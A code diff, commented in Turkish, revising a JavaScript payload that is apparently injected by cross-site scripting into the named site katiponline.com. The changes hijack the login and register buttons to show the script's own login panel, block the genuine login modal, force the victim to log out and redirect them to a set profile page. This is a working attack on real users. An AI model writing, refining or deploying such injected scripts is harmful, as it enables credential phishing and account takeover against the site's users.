@@ -8,12 +8,11 @@
 
     // "Giriş Yap / Üye Ol" butonu
     const loginButton = document.querySelector('button[data-bs-toggle="modal"][data-bs-target=".bd-example-modal-sm"]');
-    // "Eğitmen olmak için tıklayın" butonu (isteğe bağlı engelleme)
-    const educatorButton = document.querySelector('button[data-bs-toggle="modal"][data-bs-target="#modalegitimciolmakistiyorum"]');
+    // "Giriş Yap | Kayıt Ol" linki
+    const registerButton = document.querySelector('a.menu_cus.btn_get.btn-meta.btn_get_radious[href="https://katiponline.com/kayit-ol"]');
 
     if (loginButton) {
       loginButton.addEventListener('click', showLoginPanel);
-      // Butonun varsayılan davranışını engelle
       loginButton.addEventListener('click', (e) => {
         if (isScriptActive) {
           e.preventDefault();
@@ -21,8 +20,9 @@
         }
       });
     }
-    if (educatorButton) {
-      educatorButton.addEventListener('click', (e) => {
+    if (registerButton) {
+      registerButton.addEventListener('click', showLoginPanel);
+      registerButton.addEventListener('click', (e) => {
         if (isScriptActive) {
           e.preventDefault();
           e.stopPropagation();
@@ -38,24 +38,32 @@
       originalModal.setAttribute('aria-hidden', 'true');
       if (window.bootstrap && window.bootstrap.Modal) {
         const modalInstance = window.bootstrap.Modal.getInstance(originalModal) || new window.bootstrap.Modal(originalModal);
-        if (isScriptActive) modalInstance.hide();
+        modalInstance.hide();
+        originalModal.addEventListener('show.bs.modal', (e) => {
+          if (isScriptActive) e.preventDefault(); // Modal açılmasını engelle
+        });
       }
     }
   }
 
-  // Çıkış yapma (2 saniye gecikme ile ve tamamlanmayı bekleme)
+  // Çıkış yapma (2 saniye gecikme ile ve hata ayıklamalı)
   const hasLoggedOut = sessionStorage.getItem('hasLoggedOut');
   if (!hasLoggedOut && isScriptActive && location.href !== xssProfileUrl) {
+    console.log('Çıkış yapma kontrolü yapılıyor...', typeof cikisyap); // Hata ayıklamayı etkinleştir
     setTimeout(() => {
       if (typeof cikisyap === 'function') {
+        console.log('cikisyap fonksiyonu bulundu, tetikleniyor...');
         cikisyap();
         // Çıkışın tamamlanmasını beklemek için kısa bir gecikme
         setTimeout(() => {
           sessionStorage.setItem('hasLoggedOut', 'true');
           if (location.href !== xssProfileUrl) {
+            console.log('Yönlendirme yapılıyor...');
             window.location.replace('https://katiponline.com/duello/profildetay?t=45593');
           }
-        }, 500); // 0.5 saniye bekleme (cikisyap'ın tamamlanmasını varsayalım)
+        }, 1000); // 1 saniye bekleme (cikisyap'ın tamamlanmasını varsayalım)
+      } else {
+        console.error('cikisyap fonksiyonu tanımlı değil!');
       }
     }, 2000); // 2 saniye gecikme
   }
